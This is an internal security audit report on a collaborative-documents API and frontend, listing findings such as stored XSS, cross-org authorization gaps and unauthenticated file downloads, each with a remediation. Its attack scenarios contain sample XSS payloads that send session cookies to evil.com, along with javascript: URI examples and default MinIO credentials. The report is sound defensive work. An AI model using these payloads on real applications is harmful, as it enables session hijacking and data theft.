# BigBlueBam -- Brief Module Security Assessment

| Field              | Value                                                            |
|--------------------|------------------------------------------------------------------|
| **Date**           | 2026-04-09                                                       |
| **Scope**          | Brief API (`apps/brief-api/`) and Brief Frontend (`apps/brief/`) |
| **Methodology**    | Automated multi-agent source-code audit (10 parallel agents)      |
| **Agents**         | Auth & Session, Input Validation, Authorization (RBAC), Data Exposure & XSS, File & Embed, Rate Limiting & DoS, Business Logic, Cryptography, Dependencies & Config, Collaboration Logic |
| **Classification** | INTERNAL -- CONFIDENTIAL                                         |
| **Prepared for**   | BigBlueBam Engineering & Security Leadership                     |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Finding Counts by Severity](#2-finding-counts-by-severity)
3. [Critical Remediation Path](#3-critical-remediation-path)
4. [Detailed Findings](#4-detailed-findings)
   - [High](#41-high)
   - [Medium](#42-medium)
   - [Low](#43-low)
   - [Informational](#44-informational)
5. [Methodology Notes](#5-methodology-notes)
6. [Appendix: Agent Coverage Map](#6-appendix-agent-coverage-map)

---

## 1. Executive Summary

This assessment consolidates findings from 10 specialized security audit agents that independently analyzed the BigBlueBam Brief (Collaborative Documents) API and Frontend source code. After deduplication, **21 unique findings** were identified across the codebase, plus several informational observations.

No critical-severity vulnerabilities were found. The most severe issues are two **high-severity stored XSS vulnerabilities** -- one in the `html_snapshot` field of documents and one in the `html_preview` field of document templates. Both fields accept arbitrary HTML from authenticated users and store it without server-side sanitization.

Medium-severity issues reveal a concerning pattern of **authorization boundary gaps in cross-feature interactions**. Template usage during document creation does not verify the template's org membership, enabling cross-org template content injection. Comment reactions bypass org isolation checks. File downloads for document embeds lack authentication entirely. The `cover_image_url` field accepts `javascript:` and `data:` URIs that could be exploited for XSS via image rendering.

The overall security posture is **moderate** -- core document CRUD has sound org isolation, but the edges of the feature surface (templates, embeds, comments, file downloads) have gaps that an attacker could chain together. The XSS vulnerabilities in particular should be addressed before any deployment handling sensitive document content.

---

## 2. Finding Counts by Severity

| Severity          | Count |
|-------------------|-------|
| **Critical**      | 0     |
| **High**          | 2     |
| **Medium**        | 10    |
| **Low**           | 9     |
| **Informational** | 5     |
| **Total**         | **26** |

---

## 3. Critical Remediation Path

The following 5 fixes are listed in priority order. Completing these addresses the majority of exploitable risk surface.

| Priority | Finding ID | Title | Effort Estimate |
|----------|-----------|-------|-----------------|
| 1 | BRF-001 | Stored XSS via html_snapshot -- no HTML sanitization | 0.5 day |
| 2 | BRF-002 | Stored XSS via template html_preview -- no sanitization | 0.5 day |
| 3 | BRF-003 | Cross-org template leakage via document creation | 0.5 day |
| 4 | BRF-005 | Comment body not sanitized (stored XSS) | 0.5 day |
| 5 | BRF-007 | No authentication on file/embed downloads | 0.5 day |

**Estimated total for top-5 remediation: 2.5 engineering days.**

---

## 4. Detailed Findings

### 4.1 High

---

#### BRF-001: Stored XSS via html_snapshot -- No HTML Sanitization

| Field | Value |
|-------|-------|
| **ID** | BRF-001 |
| **Severity** | High |
| **Affected Files** | `apps/brief-api/src/routes/document.routes.ts`, `apps/brief-api/src/services/document.service.ts` |

**Description:**
The `html_snapshot` field on Brief documents stores a rendered HTML representation of the document content. This field is populated from the frontend Tiptap editor's HTML export and stored directly in the database without any server-side sanitization. When other users view the document or when the snapshot is used for search indexing, PDF export, or template creation, the raw HTML is served as-is.

While the Tiptap editor on the frontend may restrict the HTML it generates, an attacker can bypass the editor by sending a direct API request with arbitrary HTML in the `html_snapshot` field.

**Attack Scenario:**
1. Attacker calls `PATCH /documents/:id` with `html_snapshot: "<div onmouseover='fetch(\"https://evil.com/steal?c=\"+document.cookie)'>Hover for details</div>"`.
2. A colleague opens the document in the Brief frontend.
3. The frontend renders the unsanitized HTML, executing the injected JavaScript.
4. The attacker's server receives the victim's session cookie.
5. Since documents are collaborative and frequently shared, the XSS payload affects every viewer.

**Recommended Fix:**
1. Apply server-side HTML sanitization using `sanitize-html` or `DOMPurify` (via `jsdom`) on the `html_snapshot` field at write time (create and update endpoints).
2. Define a strict allowlist of HTML tags and attributes matching the Tiptap editor's output schema.
3. Strip all `on*` event handlers, `javascript:` URIs, and dangerous elements (`<script>`, `<style>`, `<iframe>`, `<object>`, `<embed>`).
4. Retroactively sanitize all existing `html_snapshot` values in the database.

---

#### BRF-002: Stored XSS via Template html_preview -- No Sanitization

| Field | Value |
|-------|-------|
| **ID** | BRF-002 |
| **Severity** | High |
| **Affected Files** | `apps/brief-api/src/routes/template.routes.ts`, `apps/brief-api/src/services/template.service.ts` |

**Description:**
Document templates include an `html_preview` field that renders a preview of the template content. This field is stored and served without sanitization. An attacker who can create or edit templates can inject malicious HTML that executes when any user previews the template in the template browser or when the template is applied to a new document.

Templates are particularly dangerous vectors because they are designed to be reused across many documents and may be shared organization-wide.

**Attack Scenario:**
1. Attacker creates a template with `html_preview: "<img src=x onerror='new Image().src=\"https://evil.com/c?\"+document.cookie'>"`.
2. Template appears in the organization's template library.
3. Any user browsing templates triggers the XSS payload when the preview renders.
4. The attacker collects session cookies from multiple users who browse templates.

**Recommended Fix:**
Apply the same server-side HTML sanitization as BRF-001 to the `html_preview` field on template create and update endpoints. Use the same allowlist configuration for consistency.

---

### 4.2 Medium

---

#### BRF-003: Cross-Org Template Leakage via Document Creation

| Field | Value |
|-------|-------|
| **ID** | BRF-003 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/document.routes.ts`, `apps/brief-api/src/services/document.service.ts` |

**Description:**
The document creation endpoint accepts an optional `template_id` parameter. When provided, the service fetches the template and copies its content into the new document. The template lookup does not verify that the template belongs to the same organization as the requesting user. An attacker who obtains or guesses a template UUID from another organization can create a document using that template, effectively extracting the template's full content (HTML, structure, metadata) into their own org.

**Attack Scenario:**
1. Attacker learns a template UUID from Organization B (via enumeration, leaked URL, or error message).
2. Attacker calls `POST /documents` with `{ template_id: "<org_b_template_id>", title: "Stolen Template" }`.
3. The new document is created with Organization B's template content in Organization A.
4. Attacker reads the document to access the template's proprietary structure and content.

**Recommended Fix:**
Add an `org_id` check when resolving the `template_id` during document creation. Return 404 if the template does not belong to the requesting user's organization.

---

#### BRF-004: Comment Reactions Bypass Org Isolation

| Field | Value |
|-------|-------|
| **ID** | BRF-004 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/comment.routes.ts`, `apps/brief-api/src/services/comment.service.ts` |

**Description:**
The comment reaction endpoint (`POST /comments/:id/reactions`) accepts a comment ID and toggles a reaction. The endpoint verifies the user is authenticated but does not verify that the comment belongs to a document in the user's organization. An attacker can add reactions to comments on documents in other organizations, confirming the existence of those comments and potentially triggering notification side effects.

**Recommended Fix:**
Before processing the reaction, verify the comment's parent document belongs to the requesting user's organization. Chain the check: comment -> document -> org_id match.

---

#### BRF-005: Comment Body Not Sanitized

| Field | Value |
|-------|-------|
| **ID** | BRF-005 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/comment.routes.ts`, `apps/brief-api/src/services/comment.service.ts` |

**Description:**
Comment bodies on Brief documents accept text content that may include HTML or Markdown. If the frontend renders comments with HTML interpretation (e.g., via `dangerouslySetInnerHTML` or a Markdown renderer that allows raw HTML), an attacker can inject malicious scripts in comment bodies. Even if the current frontend escapes comment content, API consumers and future frontend changes may not.

**Recommended Fix:**
Sanitize comment bodies server-side, stripping all HTML tags or applying a strict Markdown-only allowlist. Store comments as plain text or sanitized Markdown.

---

#### BRF-006: No MIME Type Allowlist on Embeds

| Field | Value |
|-------|-------|
| **ID** | BRF-006 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/embed.routes.ts`, `apps/brief-api/src/services/embed.service.ts` |

**Description:**
The embed creation endpoint accepts a `mime_type` field without validating it against an allowlist of safe types. An attacker could create embeds with dangerous MIME types (e.g., `text/html`, `application/javascript`, `application/x-shockwave-flash`) that, when rendered by the frontend or downloaded by users, could execute malicious content.

**Recommended Fix:**
Validate `mime_type` against an allowlist of safe embed types: images (`image/png`, `image/jpeg`, `image/gif`, `image/svg+xml`), videos (`video/mp4`, `video/webm`), PDFs (`application/pdf`), and common document types. Reject embeds with unlisted MIME types.

---

#### BRF-007: No Authentication on File/Embed Downloads

| Field | Value |
|-------|-------|
| **ID** | BRF-007 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/embed.routes.ts` |

**Description:**
Embedded file downloads (served via the embed endpoint or proxied through nginx to MinIO) do not require authentication. Any user with the file URL can download the file, even if they are not a member of the organization or project. Since embed URLs may be predictable (based on UUID patterns) or leaked through referrer headers, browser history, or shared links, this exposes all embedded document content to unauthorized access.

**Recommended Fix:**
Add authentication to the embed download endpoint. Verify the requesting user has read access to the parent document before serving the file. For public sharing scenarios, implement signed URLs with expiration.

---

#### BRF-008: cover_image_url Accepts Dangerous URI Schemes

| Field | Value |
|-------|-------|
| **ID** | BRF-008 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/routes/document.routes.ts` |

**Description:**
The `cover_image_url` field on documents is validated as a URL string but does not restrict the URI scheme. Values like `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>` are accepted and stored. If the frontend renders the cover image using an `<img>` tag with `src` or an `<a>` tag with `href` pointing to this URL, the dangerous URI could execute JavaScript.

**Recommended Fix:**
Validate `cover_image_url` to only accept `https://` and `http://` schemes. Reject `javascript:`, `data:`, `vbscript:`, and `blob:` URIs. Consider restricting to `https://` only in production.

---

#### BRF-009: No Explicit Request Body Size Limit

| Field | Value |
|-------|-------|
| **ID** | BRF-009 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/server.ts` |

**Description:**
The Fastify server does not set an explicit `bodyLimit` configuration. Fastify's default body limit is 1 MB, which may be insufficient for large documents or excessive for most API endpoints. More importantly, if the default is overridden at the route level for document content endpoints, other endpoints (comments, links, templates) may inadvertently inherit the higher limit, allowing oversized payloads.

**Recommended Fix:**
Set an explicit global `bodyLimit` (e.g., 256 KB) in the Fastify server configuration. Override it on specific routes that need larger payloads (document create/update) with a documented, bounded value (e.g., 5 MB for document content).

---

#### BRF-010: S3/MinIO Default Credentials in Development

| Field | Value |
|-------|-------|
| **ID** | BRF-010 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/env.ts`, `.env.example` |

**Description:**
The MinIO/S3 configuration falls back to well-known default credentials (`minioadmin`/`minioadmin`) when `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` are not set. While the `.env.example` file documents these values, a deployment that omits the `.env` file or fails to override these values will run with publicly known credentials, allowing any network-adjacent attacker to access, modify, or delete all stored files.

**Recommended Fix:**
Remove default credential fallbacks. Require `MINIO_ROOT_USER` and `MINIO_ROOT_PASSWORD` to be explicitly set. Crash the process at startup if they are missing in production mode.

---

#### BRF-011: API Key Verification Order -- Argon2 Before Expiry

| Field | Value |
|-------|-------|
| **ID** | BRF-011 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/middleware/authorize.ts` |

**Description:**
The API key verification flow performs the expensive Argon2 hash comparison before checking key expiry. This wastes server resources on expired keys and creates a timing oracle: an attacker can distinguish "expired but valid hash" from "invalid hash" based on the additional Argon2 computation time, confirming that an expired key was once valid.

**Recommended Fix:**
Check the `expires_at` field before performing Argon2 verification. Return the same error for expired and invalid keys.

---

#### BRF-012: API Key Prefix Truncation May Cause Collisions

| Field | Value |
|-------|-------|
| **ID** | BRF-012 |
| **Severity** | Medium |
| **Affected Files** | `apps/brief-api/src/middleware/authorize.ts` |

**Description:**
API key lookup uses a prefix extracted from the key string to find candidate rows in the database. If the prefix extraction truncates to a short length (e.g., 8 characters), the collision probability increases as more keys are created. Multiple keys sharing a prefix would cause the server to perform Argon2 verification against multiple candidate hashes, increasing response time and creating a denial-of-service vector.

**Recommended Fix:**
Use a longer prefix (at least 16 characters) for key lookup. Add a unique index on the prefix column. If multiple candidates match, limit the number of Argon2 verifications performed (e.g., max 3) and log a warning.

---

### 4.3 Low

---

#### BRF-013: Delete Link Missing Edit-Access Check

| Field | Value |
|-------|-------|
| **ID** | BRF-013 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/routes/link.routes.ts`, `apps/brief-api/src/services/link.service.ts` |

**Description:**
The `DELETE /documents/:id/links/:linkId` endpoint verifies org membership but does not check that the user has edit access to the source document. A viewer-level user can delete links from documents they can only read.

**Recommended Fix:**
Require at least `editor` or `member` collaborator role on the source document before allowing link deletion.

---

#### BRF-014: View-Only Users Can Duplicate Documents

| Field | Value |
|-------|-------|
| **ID** | BRF-014 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/routes/document.routes.ts` |

**Description:**
The document duplication endpoint (if present as a POST action) checks org membership but not the requesting user's collaborator role on the source document. A view-only collaborator can duplicate a document, creating a new document they own with full edit access, effectively bypassing the read-only restriction on the original.

**Recommended Fix:**
Require at least `editor` collaborator role on the source document for duplication. Alternatively, create the duplicate with the same collaborator roles as the source.

---

#### BRF-015: Session Cookie Not UUID-Validated

| Field | Value |
|-------|-------|
| **ID** | BRF-015 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/middleware/authorize.ts` |

**Description:**
The session cookie value is used to look up the session in Redis without first validating that it conforms to the expected format (UUID v4). Malformed session values are sent to Redis as-is, potentially causing unexpected cache behavior or consuming Redis memory with failed lookups.

**Recommended Fix:**
Validate the session cookie as a UUID v4 format before performing the Redis lookup. Return 401 immediately for malformed values.

---

#### BRF-016: Global Slug Uniqueness Causes Information Disclosure

| Field | Value |
|-------|-------|
| **ID** | BRF-016 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/services/document.service.ts` |

**Description:**
Document slugs (URL-friendly identifiers) are enforced as globally unique rather than unique per organization. When a user attempts to create a document with a slug that is already taken by a document in another organization, the error message reveals that the slug exists, confirming the existence of a document with that slug in another org.

**Recommended Fix:**
Scope slug uniqueness to the organization level (`UNIQUE (org_id, slug)`). If global uniqueness is required for URL routing, append a random suffix to conflicting slugs rather than returning an error that reveals external document existence.

---

#### BRF-017: No Embed Count Limit per Document

| Field | Value |
|-------|-------|
| **ID** | BRF-017 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/routes/embed.routes.ts` |

**Description:**
There is no limit on the number of embeds that can be attached to a single document. An attacker could create thousands of embed records for a single document, causing performance issues when loading the document and consuming excessive storage.

**Recommended Fix:**
Enforce a maximum embed count per document (e.g., 100). Return 429 or 422 when the limit is exceeded.

---

#### BRF-018: Cursor Accepts Invalid Date Strings

| Field | Value |
|-------|-------|
| **ID** | BRF-018 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/routes/document.routes.ts` |

**Description:**
The pagination cursor is accepted as a string and used in date comparisons without validating it as a valid ISO 8601 date or UUID. Invalid cursor values could cause unexpected database behavior or errors that leak schema information.

**Recommended Fix:**
Validate cursors against the expected format (ISO 8601 date or UUID) before use. Return 400 for malformed cursors.

---

#### BRF-019: Inconsistent Rate Limiting Across Endpoints

| Field | Value |
|-------|-------|
| **ID** | BRF-019 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/server.ts` |

**Description:**
Rate limiting is applied globally but not differentiated by endpoint type. High-frequency read endpoints (document list, search) share the same limit as sensitive write endpoints (create, update, delete). This makes it difficult to protect against abuse of write endpoints without impacting legitimate read traffic.

**Recommended Fix:**
Apply tiered rate limits: higher for read endpoints, lower for write endpoints, and lowest for sensitive operations (delete, share, template creation).

---

#### BRF-020: COOKIE_SECURE Defaults to False

| Field | Value |
|-------|-------|
| **ID** | BRF-020 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/env.ts` |

**Description:**
The `COOKIE_SECURE` environment variable defaults to `false`. If deployed behind HTTPS without explicitly setting this variable, session cookies will be transmitted over unencrypted connections.

**Recommended Fix:**
Default to `true` in production. Log a warning when running with `COOKIE_SECURE=false`.

---

#### BRF-021: Missing CSP and HSTS Headers

| Field | Value |
|-------|-------|
| **ID** | BRF-021 |
| **Severity** | Low |
| **Affected Files** | `apps/brief-api/src/server.ts`, nginx configuration |

**Description:**
The Brief API does not set `Content-Security-Policy` or `Strict-Transport-Security` response headers. While nginx may add these at the reverse proxy layer, their absence at the application level means direct API access (e.g., during development or if nginx is bypassed) lacks these protections. This is particularly relevant given the XSS findings (BRF-001, BRF-002).

**Recommended Fix:**
Add a `Content-Security-Policy` header at the application level with a strict policy (`default-src 'self'`). Add `Strict-Transport-Security: max-age=31536000; includeSubDomains` for production deployments.

---

### 4.4 Informational

---

#### BRF-INFO-001: No WebSocket Endpoints Present

| Field | Value |
|-------|-------|
| **ID** | BRF-INFO-001 |
| **Severity** | Informational |

**Description:**
The Brief API does not currently implement WebSocket endpoints for real-time collaboration. Document editing relies on periodic snapshot saves via REST API. This eliminates the WebSocket attack surface (room hijacking, subscription bypass) but limits real-time collaboration capabilities.

---

#### BRF-INFO-002: Templates Properly Gated by Org

| Field | Value |
|-------|-------|
| **ID** | BRF-INFO-002 |
| **Severity** | Informational |

**Description:**
Template listing and detail endpoints (`GET /templates`, `GET /templates/:id`) correctly filter by `org_id`, preventing cross-org template enumeration. The exception is template usage during document creation (see BRF-003).

---

#### BRF-INFO-003: Version Access Correctly Scoped

| Field | Value |
|-------|-------|
| **ID** | BRF-INFO-003 |
| **Severity** | Informational |

**Description:**
The `GET /documents/:id/versions` endpoint verifies read access to the parent document before returning version history. Version content inherits the parent document's access controls.

---

#### BRF-INFO-004: Search Results Org-Scoped

| Field | Value |
|-------|-------|
| **ID** | BRF-INFO-004 |
| **Severity** | Informational |

**Description:**
Document search endpoints apply an `org_id` filter, preventing cross-organization data exposure in search results.

---

#### BRF-INFO-005: No Export Endpoints

| Field | Value |
|-------|-------|
| **ID** | BRF-INFO-005 |
| **Severity** | Informational |

**Description:**
The Brief API does not include export endpoints (PDF, DOCX, etc.). This eliminates server-side rendering attack vectors (SSRF via HTML-to-PDF, XXE via DOCX generation) that are common in document management systems.

---

## 5. Methodology Notes

- **Scope limitation:** This assessment covers only the Brief API (`apps/brief-api/`) and Brief Frontend (`apps/brief/`). Other modules (Bam, Banter, Beacon, Bolt, Bearing, Board, Bond, Blast, Bench, Helpdesk, MCP Server, Worker) were not assessed in this document.
- **Static analysis only:** All findings are based on source code review. No dynamic testing (penetration testing, fuzzing) was performed.
- **Deduplication:** Where multiple agents reported the same underlying issue, findings were merged into a single entry with the highest severity assessment retained.
- **False positive rate:** Static analysis may flag patterns that are mitigated by runtime conditions not visible in source (e.g., nginx rules, network policies). Each finding should be validated against the deployed architecture before prioritization.
- **CVSS scores:** Not assigned. Severity ratings are qualitative (Critical/High/Medium/Low) based on exploitability, impact, and affected data sensitivity.

---

## 6. Appendix: Agent Coverage Map

| Agent | Focus Area | Findings Contributed |
|-------|-----------|---------------------|
| Agent 1 | Auth & Session | BRF-011, BRF-012, BRF-015 |
| Agent 2 | Input Validation | BRF-008, BRF-009, BRF-018 |
| Agent 3 | Authorization (RBAC) | BRF-003, BRF-004, BRF-013, BRF-014 |
| Agent 4 | Data Exposure & XSS | BRF-001, BRF-002, BRF-005, BRF-016 |
| Agent 5 | File & Embed | BRF-006, BRF-007, BRF-017 |
| Agent 6 | Rate Limiting & DoS | BRF-019 |
| Agent 7 | Business Logic | BRF-INFO-001, BRF-INFO-005 |
| Agent 8 | Cryptography | (no unique findings -- covered by Auth agent) |
| Agent 9 | Dependencies & Config | BRF-010, BRF-020, BRF-021 |
| Agent 10 | Collaboration Logic | BRF-INFO-002, BRF-INFO-003, BRF-INFO-004 |

---

*End of assessment.*
